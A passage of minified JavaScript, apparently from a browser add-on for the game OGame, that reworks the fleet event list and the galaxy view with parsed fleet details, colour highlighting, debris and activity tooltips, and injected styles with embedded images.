b.getTime()+'"></span>'),ga.updateReversalClock()}else g(a).attr("ago_events_reverse","1")},updateReversalClock:function(){for(var a=g("#inhalt .ago_movement_reversalTime"),b=0;b<a.length;b++){var c=n.d(g(a[b]).attr("title"));if(c){var d=new Date;d.setTime(2*(d.getTime()-A.timeDelta)-c-A.timeZoneDelta);g(a[b]).html(A.format(d))}}},getDetails:function(a){if(a){var b={ships:"",cargo:""},c="";a=a.getElementsByTagName("td");for(var d=0;d<a.length;d++)"2"===a[d].colSpan?(b.ships=c,c=""):("value"!==a[d].className&&
""!==c&&(c+=" "),c+=a[d].innerHTML);b.cargo=c;b.ships=b.ships.split("  ").join("");b.cargo=b.cargo.split("  ").join("");return b}return null},expandFleet:function(a){var b=n.parseIntAbs(a.id);if(e.is("E12")&&b&&(b=ga.getDetails(document.getElementById("bl"+b)))){var c=r.trim(g(".mission",a).text()),d='<div class="ago_movement_details '+f.getMissionClass(ga.missionByName[c]||8)+'">'+b.ships+"<br/><br/>"+b.cargo+"</div>";g(".starStreak .route",a).css("display","none").before(d);c&&0===g(".reversal",
a).length&&(c+=g(".nextMission",a).length?" ("+c.charAt(0)+")":" ("+e.label("E18")+")",g(".mission",a).text(c));b=11*(Math.ceil((b.ships+b.cargo).length/50)+1)-32;0<b&&q.set(["#"+a.id+".fleetDetails.detailsOpened { height: "+(74+b)+"px; }","#"+a.id+".fleetDetails.detailsOpened .starStreak{ height: "+(50+b)+"px; }"])}},showTargetName:function(a){var b=g(".destinationCoords",a).attr("title");b&&g(".mission",a).after('<span class="ago_movement_targetName">'+b+"</span>")}},H={Load:function(){!H.status&&
e.is("E30")&&(H.status=2,H.modeBehavior=e.get("overview"===e.page?"E41":"resources"===e.page||"station"===e.page?"E47":"shipyard"===e.page||"defense"===e.page?"E48":"fleet1"===e.page?"E42":"fleet2"===e.page?"E43":"fleet3"===e.page?"E44":"movement"===e.page?"E45":"galaxy"===e.page?"E46":"E49"),H.modeBehaviorAbove=J.check(H.modeBehavior,1,2,5,6),H.modeImprove=e.is("E31"),H.modeAbbreviation=e.is("E35"),H.modeColorOwn=e.is("CO0"),H.modeColorMissions=e.is("CM0"))},Run:function(){var a,b,c;if(2===H.status&&
(H.status=4,a=document.getElementById("eventboxContent")))b=document.getElementById("eventListWrap"),c=H.modeBehavior?J.check(H.modeBehavior,2,4,6,8)?2:1:b?1:0,a.setAttribute("ago_display_status",c),!b&&5>H.modeBehavior&&h.addClass(a,"ago_eventlist_hide"),H.modeBehavior&&(a.parentNode.children[0]===a?H.modeBehaviorAbove||h.append(a.parentNode,a):H.modeBehaviorAbove&&h.prepend(a.parentNode,a),q.set("#eventboxContent:not(:first-child), #eventboxContent:first-child { display: inherit; }")),b&&H.Show()},
Ready:function(){H.modeBehavior&&5>H.modeBehavior&&(h.setDisplay(document.getElementById("eventboxContent"),"",!1),q.set("#eventListWrap, #eventboxContent { display: block; }"))},Show:function(){var a,b,c,d,e,g,k,l;a=document.getElementById("eventboxContent");b=document.getElementById("eventListWrap");if(4<=H.status&&a&&b&&!b.getAttribute("ago-status")){h.hasClass(a,"ago_eventlist_hide")&&h.removeClass(a,"ago_eventlist_hide");b.setAttribute("ago-status",1);a=1;H.arrival=[];H.Events={};c=b.querySelector("#eventHeader");
d=h.createA({});d.addEventListener("click",H.reloadEvents,!1);e=d.appendChild(document.createElement("span"));e.className="icon icon_reload ago_eventlist_reload";h.prepend(c,d);H.modeImprove&&(e=document.createElement("span"),e.className="ago_display_arrow",c.addEventListener("click",H.toggleEvents,!1),h.prepend(c,e));b=b.querySelectorAll("table#eventContent > tbody > tr");for(c=0;c<b.length;c++)if(e=b[c],w.hasClass(e.className,"allianceAttack")?(l=1,g=k=n.parseIntAbs(e.className)):w.hasClass(e.className,
"partnerInfo")?(l=2,k=n.parseIntAbs(e.className),g=n.d(h.getAttribute(".icon_movement span","data-federation-user-id",e))):(k=l=0,g=n.parseIntAbs(e.id)),g){H.Events[g]||(H.Events[g]={id:g});d=H.Events[g];d.union=k;d.unionType=l;k=e;l=d;for(var m=void 0,p=void 0,q=void 0,s=void 0,u=void 0,q=q=void 0,u=0;u<k.children.length;u++)if(m=k.children[u],q=k.children[u].className,w.hasClass(q,"countDown"))p=m,l.fleetType=w.hasClass(q,"neutral")?1:w.hasClass(q,"hostile")?2:0;else if(w.hasClass(q,"arrivalTime"))q=
(m.textContent||"").split(" ")[0],m.textContent=A.convertLocal(q,"[H]:[i]:[s]");else if(w.hasClass(q,"missionFleet")){if(q=m.querySelector("img"))l.mission=f.getMission(q.src),l.missionName=(q.title||"").split("|")[1]}else if(w.hasClass(q,"originFleet")){if(s=m.querySelector("figure"))l.typeOrigin=w.hasClass(s.className,"moon")?Y:w.hasClass(s.className,"tf")?2:T}else if(w.hasClass(q,"coordsOrigin")){if(s=m.querySelector("a"))l.coordsOrigin=f.stripCoords(s.textContent),f.PlanetsByCoords[l.coordsOrigin]&&
(l.owncoordsOrigin=1,H.modeColorOwn&&h.addClass(s,w.classType(l.typeOrigin)))}else if(w.hasClass(q,"destFleet")){if(s=m.querySelector("figure"))l.type=w.hasClass(s.className,"moon")?Y:w.hasClass(s.className,"tf")?2:T}else if(w.hasClass(q,"destCoords")){if(s=m.querySelector("a"))l.coords=f.stripCoords(s.textContent),f.PlanetsByCoords[l.coords]&&(l.owncoords=1,H.modeColorOwn&&h.addClass(s,w.classType(l.type)))}else if(-1<q.indexOf("icon_movement")){if(s=m.querySelector("span")){var m=l,s=s.title,x=
void 0,y=void 0,z=y=void 0;if(s){x=s.split("<td>");for(z=1;z<x.length;z++)y=(x[z].split("</td>",1)[0]||"").replace(/\:/g,"").trim(),(y=f.getItemByName(y))&&(m[y]=n.parseIntAbs(x[z].split(">",3)[2]))}}l.reverse=-1<q.indexOf("icon_movement_reserve")}else w.hasClass(q,"sendMail")&&(l.nick=h.getAttribute(h.getChildnodeByName(m,"A"),"data-player-name"));H.modeColorMissions&&p&&(p.className+=" "+f.getMissionClass(l.mission));H.modeColorMissions&&d.reverse&&(e.className+=" ago_events_reverse");e.addEventListener("click",
H.clickRow,!1);if(H.modeImprove){!d.fleetType&&(1!==d.unionType&&4!==d.mission)&&(d.pair=d.reverse?H.Events[g-1]?H.Events[g-1].pair:"":(5===d.mission||15===d.mission)&&H.Events[g-1]&&H.Events[g-1].pair?H.Events[g-1].pair:a++,e.setAttribute("ago-events-pair",d.pair),e.addEventListener("mouseover",H.displayPair,!1),e.addEventListener("mouseout",H.displayPair,!1));p=l=k=k=g=void 0;g=document.createElement("td");g.className="ago_eventlist_activity";d.fleetType?(k=g.appendChild(document.createElement("img")),
k.src=2===d.fleetType?"/cdn/img/galaxy/activity15.gif":"/cdn/img/galaxy/activity.gif"):g.textContent=d.pair||"";h.prepend(e,g);k=document.createElement("tr");k.className="ago_eventlist";d.pair&&k.setAttribute("ago-events-pair",d.pair);g=k.appendChild(document.createElement("td"));g.setAttribute("colspan",12);l=g.appendChild(document.createElement("div"));l.className="ago_eventlist_left";p=l.appendChild(document.createElement("span"));p.className="ago_eventlist_mission"+(H.modeColorMissions?" "+f.getMissionClass(d.mission):
"");p.textContent=d.missionName||"";p=l.appendChild(document.createElement("span"));p.className="ago_eventlist_date";p.textContent="";d.owncoordsOrigin||(p=l.appendChild(document.createElement("span")),p.className="ago_eventlist_player",p.textContent=d.nick||"");l=g.appendChild(document.createElement("div"));l.className="ago_eventlist_fleet";q=y=z=u=m=x=s=m=p=void 0;m={ItemShipCivil:1,ItemShipCombat:1,ItemResource:1};p=document.createElement("table");p.className="ago_eventlist_table";for(u in m){z=
0;y=!1;m=null;for(q in f[u])if(d[q]||"ItemResource"===u){if(0===z||3<=z)z=0,m=p.appendChild(document.createElement("tr")),!y&&"ItemShipCivil"!==u&&(m.className="ago_eventlist_table_part");z++;d[q]&&(y=!0);s=m.appendChild(document.createElement("td"));x=s.appendChild(document.createElement("span"));x.className="ago_eventlist_label";x.textContent=f.getItemLabel(q,H.modeAbbreviation);s.appendChild(document.createTextNode(r.formatNumber(d[q])))}!y&&m&&(m.style.display="none");0<z&&3>z&&(m.appendChild(document.createElement("td")),
1===z&&m.appendChild(document.createElement("td")))}l.appendChild(p);l=g.appendChild(document.createElement("div"));l.className="ago_eventlist_right";d.owncoords||(p=l.appendChild(document.createElement("span")),p.className="ago_eventlist_player",p.textContent=d.nick||"");d.pair&&(k.addEventListener("mouseover",H.displayPair,!1),k.addEventListener("mouseout",H.displayPair,!1));h.after(e,k)}}}},styles:function(){var a;2===H.status&&(H.modeBehavior&&(a=H.modeBehaviorAbove?":not(:first-child)":":first-child",
q.setCache(["#eventboxContent"+a+" { display: none; }"]),5>H.modeBehavior&&q.setCache(["#eventListWrap, #eventboxContent { display: none; }"])),q.setCache(["#eventboxContent.ago_eventlist_hide { position: absolute; }","#eventboxContent.ago_eventlist_hide, #eventboxContent.ago_eventlist_hide #eventListWrap, #eventboxContent.ago_eventlist_hide > img { display: none; }","#eventListWrap { margin-bottom: 5px; }","#eventboxContent { margin: 0; }","#eventHeader .ago_eventlist_reload { position: absolute; left: 14px; margin: 4px 0px; }"]),
H.modeImprove&&q.setCache(['.eventFleet[style*="none"] + .ago_eventlist, .partnerInfo[style*="none"] + .ago_eventlist, .ago_eventlist + .ago_eventlist { display: none; }','#eventboxContent[ago_display_status="1"] .ago_eventlist, .ago_eventlist:first-child { display: none; }',"#eventHeader { cursor: pointer; }","#eventHeader .ago_display_arrow { float: right; position: absolute; right: 10px; margin: 4px 0px; }","table#eventContent { border-spacing: 0px; color: "+q.color.textBlueGrey+"; }","#eventContent .originFleet, #eventContent .destFleet { max-width: 105px; white-space:nowrap; overflow: hidden; text-overflow: ellipsis; }",
"#eventContent .originFleet span, #eventContent .destFleet span { width: 105px; }","table#eventContent .odd, table#eventContent .part-even { background-color: transparent; }","table#eventContent .ago_eventlist_pair { background-color: #1B2026 !important; }",'#eventboxContent[ago_display_status="1"] table#eventContent td { border-bottom: 1px solid#1A2437; }',"table#eventContent tr.ago_eventlist > td { padding-bottom: 3px; border-bottom: 3px solid #1A2437; }","table#eventContent .eventFleet > td { padding: 2px 2px; }",
"table#eventContent td.countDown { min-width: 94px; max-width: 130px; }","table#eventContent td.ago_eventlist_activity { min-width: 14px; }",".icon_movement, .icon_movement_reserve { display: table-cell; }","#fleet2 #eventContent .countDown { cursor: -moz-zoom-in; }","#fleet2 #eventContent .countDown { cursor: -webkit-zoom-in; }","table#eventContent a { text-decoration: none; }","table#eventContent .ago_eventlist { font-size: 11px; }",".ago_eventlist { font-size: 11px; }",".ago_eventlist div { overflow: hidden; display: inline-block; vertical-align: top; }",
".ago_eventlist_left { width: 157px; max-width: 147px; margin: 2px 0; }",".ago_eventlist_fleet { width: 400px; max-width: 400px; margin: 2px 9px; }",".ago_eventlist_right { width: 75px; max-width: 80px; margin: 2px 0; }",".ago_eventlist_date { float: right; }",".ago_eventlist_player { display: block; text-align: right; margin: 2px 0; }",".ago_eventlist_left .ago_eventlist_player { font-size: 12px; font-weight: bold; }",".ago_eventlist_table { width: 100%; padding: 5px 0; margin: 0; border-collapse: collapse; }",
".ago_eventlist_table { border-bottom: 4px solid #0A0C11; background-color: #0A0C11 ! important; }",".ago_eventlist_table td { min-width: 120px; max-width: 130px; font-size: 9px; color: "+q.color.textMenu+"; line-height: 10px; text-align: right; padding: 1px 4px; }",".ago_eventlist_table_part:not(:first-child) td { padding-top: 5px; }",".ago_eventlist_table .anti_value { float: right; }",".ago_eventlist_table .ago_eventlist_label { float: left; white-space: nowrap; padding-right: 3px; }"]))},reloadEvents:function(){g.get("/game/index.php?page=eventList&ajax=1",
function(a){g("#eventboxContent").html(a)});return!1},toggleEvents:function(a){if(a.target&&("H4"===a.target.nodeName||"ago_display_arrow"===a.target.className))a=n.d(h.getAttributeById("eventboxContent","ago_display_status"))+1,h.setAttribute("#eventboxContent","ago_display_status",2<a?1:a)},clickRow:function(a){a&&a.target&&(a=a.target.className,w.hasClass(a,"countDown")&&N.EventList&&N.EventList(h.getText(".arrivalTime",this)))},displayPair:function(a){var b;b=this.getAttribute("ago-events-pair");
0<b&&("mouseover"===a.type?h.addClassAll('.eventFleet[ago-events-pair="'+b+'"], .ago_eventlist[ago-events-pair="'+b+'"]',"ago_eventlist_pair",document.getElementById("eventboxContent")):h.removeClassAll(".eventFleet, .ago_eventlist","ago_eventlist_pair",document.getElementById("eventboxContent")))}},R={debrisImage:"data:image/gif;base64,R0lGODlhHgAeAPf/AGM3N8YeHrsdHUoMDEAKCkcVFZsZGVkODk8MDIkVFbUbG0MLC54YGJwYGJcXF5MXF4EUFD0KCjwKCnkSEjsJCUULC3IREXAREd8yMtwxMdoxMdUvL+NEROE4ONcwMNsxMd4yMuAyMuAzM6MZGdYwMOVSUuNJSdIvL+ROTlMNDeJBQeRNTW4REeNDQ2EPD+ZXVz0JCW8REXAcHFUlJdMgIMgeHuE6OpBPT+deXlcODuRKSr4qKuA1NcotLbkpKdkwMOJAQOZaWuE5OeI+PuRPT2wREeRLS+AtLWsQEOE3N+ZbW90xMc8uLtcpKXcSEo07O3sTE3ZGRnwcHJQzM40VFaFLS9IgIMwuLphYWMpCQswgIGwtLXIpKedgYONGRtxISM85OcpRUXVRUZ05OXE2NrU7O+E7O2U8PGgfH588PMMsLKoaGoBLS+RJSbRCQnBKSuJOTlkjI1cREeVVVeBhYeRMTNEgIIRbW7kcHFIkJIhaWlYaGuA0NFAMDGgQEHkcHNUwMMEeHohWVuZcXM4uLmMPD5keHnEnJ1UoKH0sLNgtLZoXF2gpKdg3N6cZGcI4OMtiYqFCQuAwMIwoKN0zM9MrK7McHLYcHN9ZWd5UVOZZWZ9SUqIwMKM0NOBDQ45AQE4cHKczM+djY+hjY18yMtwqKqRHR24/P5IkJJArK+E8POI6OmsXF24VFcIoKEgLC9cuLtA/P7khIb8lJcNLS8dISIRPT+VRUbZXV283N+hmZtAtLYFDQ4dCQt8vL4tJScUpKVkqKl8uLuVTU8lMTJAeHpcdHc1ERNwiIuI8PLQ4OHBHR3JERLoqKtgzM14ODnhSUsggIONISOdbW00WFnAsLNwvL+dcXH4zM35HR2Q1NeNCQm4oKHE+PnISEoZaWp8+Pm0rK1smJsUeHpQXF60wMLNYWL8rK7RZWW9DQ1geHlwdHedhYXxaWmwvL9UpKZEWFuVUVLAaGrIbG6wbG1gREdQxMbkoKOI9PcMeHohVVXQSEtgwMMgqKk0MDAAAACH5BAEAAP8ALAAAAAAeAB4AAAj/AP8JHEiwoMGDCBMqXMiwYUEA1XKJQdjujh59N7gVWLjFUyZ0v04Z/AaJzrRrHYrFUSguC7suL2pF4rVsoKBRooKgEAICz74KCdO8eDGnRIkvtKqweRMFzjBpPDX8sPMsIbY2KFYY0bHiVoljZIQ1GiIigwYS8lwQSOgOjAkvHFSoaNHiyp4CWjCYhfVgwUIAZUxwGJJEBAYQDyQsqJHhAw0LERqCW8HBjF4NTS78izBOg4ADC6EN7LWNg40lZ2v0+QfjEgOg/xB4QzDwTLYbm3BtEtgtFocOGTxsWESBtb9/BORIcRWCgV+BY+IpwRHE1D9SylTw+fDOwauCMuxx/8CHodSEgetQOdNRAsUTRJNWYQjAAoZBRqGSAP/goOABesmY8EgeMogwTwoKoTGCIh5YYFAFEBwRAhfUtDIAAQlAYFA6Ag3gxAigHVRIJZyAQsAAI/jSwD/aMGMLFuYQ00k9ERBAQGQIqXPIDKxEE0IIxvzzSRiY6IIDEUAgQ04Oayk0QypHYCACD4b844YSg2hCRAvAkWBFAywgFEw45aiCwQdLYGDAP1PUYYQJQPCAwVkbbDACQolQ0sGZ/PyQAQP//CGJDXuaBcgJuyRA20FoWGKNBsJt4IEj/7hAAwZ6CUdIP1AsVEEMAZzABBMnrPFPCgGAkMEGPagxSwwSNDyUQgLwTMBCDv8MoACr5zQjSxHFORQBjgNRsYMPPghQhEMKWXDPDoEgwaxCSACTjx/TKuSCAjFk621BAQEAOw%3D%3D",
Run:function(){var a,b;if(e.isOr("G00","D40")&&(R.InitOgame(),m.InitGalaxy(),m.InitStatus(R.clickTooltip),(a=document.getElementById("galaxytable"))&&a.innerHTML))b='<table id="galaxytable" data-galaxy="'+(a.getAttribute("data-galaxy")||"")+'" data-system="'+(a.getAttribute("data-system")||"")+'">',R.Show(0,{responseText:b+a.innerHTML});m.setStorage("Fleet_CountProbes",n.d(s.spionageAmount,4))},Unload:function(){e.is("D40")&&m.setStorageObject("GalaxyTemp",m.GalaxyTemp,!1)},Tooltip:function(a,b,c,
d){return w.hasClass(c,"activity ")?2:d},Keydown:function(a){return 13===a.keyCode?(h.click("#galaxytableHead #showbutton"),!1):!0},InitOgame:function(){e.is("G00")&&(s.sendShips=function(a,b,c,d,e,h){1===+s.shipsendingDone&&(s.shipsendingDone=0,s.sendString="",a={mission:a,galaxy:b,system:c,position:d,type:e,shipCount:h},a.speed=f.getShipSpeedMaximal(f.PlanetsActive.galaxy,b,xa),g.post(s.miniFleetLink,a,function(a){"function"===typeof s.displayMessage&&s.displayMessage(a)}))})},Show:function(a,b){var c,
d,j;c=document.getElementById("galaxytable");4<=R.status&&(e.isOr("G00","D40")&&c&&!c.getAttribute("ago-status"))&&(g(".overlayDiv").dialog("destroy"),c.setAttribute("ago-status",1),j=b&&b.responseText?R.parse(b.responseText):[],e.is("G00")&&j[0]&&(R.sameCoords=R.coords===j[0],R.coords=j[0],R.selectCoords?(R.currentCoords=R.selectCoords,R.selectCoords=""):(R.currentCoords=r.getUrlPara("position")||r.getUrlPara("planet"),R.currentCoords=n.isMinMax(R.currentCoords,1,15)?r.getUrlPara("galaxy")+":"+r.getUrlPara("system")+
":"+R.currentCoords:""),d=c.querySelectorAll(".row"),R.changeOrder(c,d,j),R.showDetails(d,j),R.showHighlight(d,j)))},styles:function(){if(e.is("G00")){var a=e.get("G02");q.setCache(["#galaxy #galaxytable a { text-decoration: none; }","#galaxytable tr.row .moon .activity { cursor: pointer; } ",".ago_debris, .ago_rank { font-size: 10px; color: "+q.color.textBright+"; }",".ago_debris { font-size: "+[11,10,9,9][a]+"px; position: absolute; top: 2px; min-width: 40px; text-align: center; }","a.ago_rank { float: right; padding-right: 2px; }",
"#message-wrapper { display: block !important; }","#message-wrapper div:first-child { position: relative; left: 420px; width:40px; z-index: 1; }","#galaxy #galaxytable tr.row td.spacer03 { width: 6px;  }"]);(e.is("G01")||a)&&q.setCache(["#galaxy #galaxytable tr.row td.microplanet { background-size: "+[28,28,26,24][a]+"px !important; background-position:7px 2px !important; }",'#galaxy #galaxytable tr.row td.moon img[width="32"] { width: '+[26,26,24,22][a]+"px; height: "+[26,26,24,22][a]+"px; padding-top: 2px; }",
'#galaxy #galaxytable tr.row td.debris img[width="32"] { width: '+[30,28,26,24][a]+"px; height: "+[30,28,26,24][a]+"px; }","#galaxy div.activity.showMinutes { font-size: "+[10,10,9,9][a]+"px; padding: 0 1px 1px 1px; width: auto; height: auto; }"]);e.is("G01")&&(q.setCache("#galaxy #galaxytable tr.row { background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAo4AAAAfCAYAAABpq0wvAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAU5JREFUeNrs282JwzAQBtCVnBJy3gZSh/pyX64jDeScFpwJLCwsGwz+I0Tye1cjI02G4XOcpJRzPMYxfQEAwITcdZGVAQCAWeFRCQAAEBwBABAcAQB4r9PUhZR+/i9TlIiNhkbOUSo7Tw37NV84yqzT6x/0OUWEKmyQNTrCwaIzFPvVF7Cgp/W62dOUkxIAAEd2/r70a9bdb9f+CPf5y28cAQChcePaVu8jOAIAsIrgCACA4AgAgOAIAIDgCACA4AgAgOAIAIDgCAAAgiMAAIIjAACCIwAAgiMAAIIjAACCIwBAde63a7/H2lbv819KOcdjHNPrhVS0EzsZKt9/qew8NezXfOEos06vf5iIGFRhndx14RtHAADmhceFT06wxxN4zWcY7FdfwIKe1utmT1MmX1UDAMAvr6oBAJgfHpUAAADBEQAAwREAgPd6CjAAi0pZTP9xHngAAAAASUVORK5CYII%3D); }"),
q.setCache("#galaxy #galaxytable tr.ago_row { background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAo4AAAAfCAYAAABpq0wvAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAS9JREFUeNrs200KgzAQBtBO9Ahd9wI9lGfzUF7AtVewKXRVCoJ/SI3vbcWQjEP4iFpHSvk1jnEDAIAJqapyUgYAAGaFRyUAAEBwBABAcAQA4Fj11IWIz/8yrRKxUVPIOtqTrecM87W/cJW9Tq//0XPKOavCBkmjIxwsWkNrvvoCFvS0Xrf3FKVWAgDgyu6P56pjyKHv4grjfPONIwAgNG68t9RxBEcAAFYRHAEAEBwBABAcAQAQHAEAEBwBABAcAQAQHAEAQHAEAEBwBABAcAQAQHAEAEBwBABAcAQAOJ2h72KPe0sd51etZQAA4dE4czhxBABgc3BslIcdNIWtoTFffQELelqv23uKEpFSfo1jKAUAAFNSVWWvqgEAmBcelQAAAMERAADBEQCAY70FGAD++FbeS9nIAAAAAABJRU5ErkJggg%3D%3D); }"),
q.setCache("#galaxy #galaxytable td.ago_debris_shadow { background: no-repeat scroll 12px 3px transparent url(data:image/gif;base64,R0lGODlhHAAcAKIEABQdKhQeKxUeKxMdKgAAAAAAAAAAAAAAACH5BAEAAAQALAAAAAAcABwAAAOqSLrc/kxIAacIFBIxBsCOAHQd+IjkJy0c2alP4L5gOw9ZI9+ddAOrEK9ne+VCo9/GZdLsZoFlT5MrkigcoOKSCwQ+2x92/PVkmJuksWGNEp6D6LPJUnvqr7dZky5FdhIgXiFbX0dhAFsjiRNfAFobFRMpb3ZGh38uiZaabhEomnpDdzo8iXBQmKChViSeIaiMPK8Vj15YlrR8h3a6fA5zv8I7vsJsccbJvwkAOw%3D%3D); }"),q.setCache(["#galaxyLoading { opacity: 0.3; background-position: center 0px; }",
"#galaxy #galaxytable tr.row td.spacer01 { width: 1px; }","#galaxy #galaxytable tr.row td.position { width: 22px; padding-right: 5px }","#galaxy #galaxytable tr.row td.planetname, #galaxy #galaxytable tr.row td.planetname1 { width: 128px; }","#galaxy #galaxytable tr.row td.debris { width: 40px; padding-left: 4px; }","#galaxy #galaxytable tr.row td.playername .status { float: right; }","#galaxy #galaxytable tr.row td.spacer03 { width: 31px; text-align:right; }","#galaxy #galaxytable tr.row td.allytag { width: 101px; padding-left: 5px; }"]));
a&&q.setCache(["#galaxy #galaxytable tr.row { background-position: 0px "+[0,-1,-2,-3][a]+"px; }","#galaxy #galaxytable tr.row td, #galaxy #galaxytable td.moon a, #galaxy #galaxytable td.debris a { height: "+[32,30,28,26][a]+"px; }","#galaxy #fleetstatusrow { height: 20px !important; font-size: 10px !important; }"])}},parse:function(a){var b,c,d,j=[];a=a&&0<a.indexOf('id="galaxytable"')?a.split('<tr class="row">'):"";var g=P.stripAttribute(a[0],"data-galaxy"),h=P.stripAttribute(a[0],"data-system");
if(g&&h&&16===a.length){j[0]=g+":"+h;for(var g=A.timestamp(),h=m.setGetTimestamp(j[0],g),k=1;k<a.length;k++){j[k]={index:k,timestamp:g,coords:j[0]+":"+k};var l=j[k];d=a[k];var p=0;if(d){if(c=P.outerHTML(d,"td","class","microplanet",p))p+=c.length,-1<c.indexOf('id="pos-planet"')&&(l.planet=!0,-1<c.indexOf('class="activity')&&(l.planetActivity=P.innerText(P.outerHTML(c,"ul",'class="ListLinks"'),"<li>",0,C)||1));if(c=P.outerHTML(d,"td","class","planetname",p))p+=c.length,l.playerBuddy=f.getPlayerStatus(c,
47);if(c=P.outerHTML(d,"td","class","moon",p))p+=c.length,-1<c.indexOf("data-moon-id=")&&(l.moon=!0,-1<c.indexOf('class="activity')&&(l.moonActivity=P.innerText(P.outerHTML(c,"ul",'class="ListLinks"'),"<li>",0,C)||1));if(c=P.outerHTML(d,"td","class","debris",p))p+=c.length,c=P.outerHTML(c,"li",'class="debris-content',"",0,!0),c.length&&(l.debrisMetal=P.innerText(c[0],"li",0,C),l.debrisCrystal=P.innerText(c[1],"li",0,C));if(c=P.outerHTML(d,"td","class","playername",p))p+=c.length,b=c.indexOf('id="player'),
0<b&&(l.playerID=n.parseIntAbs(c.slice(b+8,b+20)),l.playerID&&(l.playerStatus=f.getPlayerStatus(c),l.playerName=P.innerText(P.outerHTML(c,"h1","<h1>","",b),"<span"),l.playerRank=P.innerText(c,"searchRelId="+l.playerID,b,C)));if(c=P.outerHTML(d,"td","class","allytag",p))p+=c.length,b=P.outerHTML(c,"a","searchRelId="),l.allianceRank=P.innerText(b),l.allianceHighscore=P.attribute(b,"href"),l.allianceID=n.parseIntAbs(l.allianceHighscore.split("searchRelId=")[1]),l.allianceID&&(l.allianceOwn=f.getPlayerStatus(c,
41),l.allianceTag=P.innerText(c,' rel="alliance'),l.allianceName=P.innerText(c,"<h1>"),l.allianceMember=P.innerText(c,' class="members"',0,C));if(c=P.outerHTML(d,"td",'class="action',p))b=c.indexOf('lick="sendShips'),0<b&&(l.actionEspionage=(c.slice(b).split("(",2)[1]||"").split(")",1)[0]);l.playerID&&l.playerID!==n.d(e.playerID)&&(l.planetActivityChange=m.setActivityTimestamp(l.coords+":1",g,h,l.planetActivity),l.moonActivityChange=m.setActivityTimestamp(l.coords+":3",g,h,l.moonActivity));l.debrisSizeChange=
m.setGalaxyDebris(l.coords+":2",g,h,l.debrisMetal,l.debrisCrystal);e.is("CS0")&&(d=m.getStatus(l.allianceID,1)||l.allianceOwn,l.allianceColor=d?w.classStatusColor(d):"",d=m.getStatus(l.playerID,2)||l.playerBuddy,l.playerColor=d?w.classStatusColor(d):l.allianceColor,d=m.getStatus(l.coords,3),l.positionColor=d?w.classStatusColor(d):l.playerColor)}}2===m.Info.Galaxy.status&&m.saveGalaxy()}return j},clickTooltip:function(a,b,c){a&&b&&(1===+b?I.getUniverseByPlayerId(a,$.insertPlanets):(m.setStatus(a,+b,
+c),h.click("#galaxytableHead #showbutton")));h.click("div.t_Tooltip.t_visible .t_Content .close-tooltip")},changeOrder:function(a,b,c){if(e.is("G01")){a=g("#galaxyheadbg2 th",a);g(a.eq(0).css("width","60px")).before(a.eq(1).css("width","150px"));a.eq(4).css("width","160px");for(var d=0;d<b.length;d++)c[d+1].planet&&g(b[d]).addClass("ago_row"),a=b[d].querySelectorAll("td.microplanet, td.microplanet1, td.planetname, td.planetname1, td.moon, td.debris"),4===a.length&&(b[d].insertBefore(a[1],a[0]),b[d].insertBefore(a[2],
a[3]))}},showHighlight:function(a,b){for(var c,d=0;d<a.length;d++){var j=a[d],f=b[d+1];c=e.isAnd("CC0","CC1");var h=e.isAnd("CS0","CS1");if(c||h)f.currentHighlight=c?m.checkHightlight(f,98,4)||m.checkHightlight(f,95,4)||m.checkHightlight(f,97,4)||m.checkHightlight(f,96,4)||m.checkHightlight(f,94,4)||m.checkHightlight(f,93,4)||(R.currentCoords&&R.currentCoords===R.coords+":"+f.index?m.checkHightlight(f,81,4):0)||0:0,c=f.currentHighlight,!f.currentHighlight&&h&&(f.allianceHighlight=m.checkHightlight(f,
m.getStatus(f.allianceID,1),1)||m.checkHightlight(f,f.allianceOwn,1),f.playerHighlight=m.checkHightlight(f,m.getStatus(f.playerID,2),2)||m.checkHightlight(f,f.playerBuddy,2)||m.checkHightlight(f,f.playerStatus,2),f.positionHighlight=m.checkHightlight(f,m.getStatus(f.coords,3),3),c=f.positionHighlight||f.playerHighlight||f.allianceHighlight),c&&g(j).addClass(w.classStatusHighlight(c))}},showDetails:function(a,b){for(var c,d,j=0;j<a.length;j++){var f=a[j],h=b[j+1];h.positionColor&&g(".position, .planetname",
f).addClass(h.positionColor);h.playerID&&(c="name"+h.playerID+"_"+(j+1),(d=m.getTooltip(h.coords,"",3,c,"",h.coords))&&g(".planetname",f).addClass("tooltipRel tooltipClose tooltipRight").attr("rel",c).append(d));h.coords&&(c=g("td.microplanet",f),c.length&&(d=R.getActivityTooltip(h.coords+":1"))&&g("div.htmlTooltip.galaxyTooltip ul.ListLinks",c).append(d));h.moon&&(c=g("td.moon ",f),c.length&&(d=R.getActivityTooltip(h.coords+":3"))&&g("div.htmlTooltip.galaxyTooltip ul.ListLinks",c).append(d));var k=
h.debrisMetal+h.debrisCrystal;if(k){R.getDebrisTooltip(h.coords+":2");c=e.get("G45");d=0;e.is("CC0")&&(n.isGreater(k,n.d(e.getPair("H94")[1]))?d=94:n.isGreater(k,n.d(e.getPair("H93")[1]))&&(d=93));if(1===c){var l=e.get("G02"),p=[30,28,26,24][l],k=n.minMax(2+3*r.d(k).length-l,14,p);d?g("td.debris a.tooltipRel img",f).attr({width:k,height:k,src:R.debrisImage}):g("td.debris a.tooltipRel img",f).attr({width:k,height:k})}1<c&&(c='<div class="ago_debris'+r.wrap(" ",w.classStatusColor(d))+'"><span'+(d?' class="ago_text_background"':
"")+">"+(3===c&&!R.sameCoords?r.shortNumber(h.debrisMetal,0):r.formatNumber(h.debrisMetal))+"<br/>"+(3===c&&!R.sameCoords?r.shortNumber(h.debrisCrystal,0):r.formatNumber(h.debrisCrystal))+"</span></div>",e.is("G01")?g("td.debris a.tooltipRel img",f).hide().parent().append(c).parent().addClass("ago_debris_shadow"):g("td.debris a.tooltipRel img",f).hide().parent().append(c))}h.playerID&&(c=g(".playername",f),c.length&&((d=m.getTooltip(h.playerID,h.playerName,2))&&g("div.htmlTooltip.galaxyTooltip ul.ListLinks",
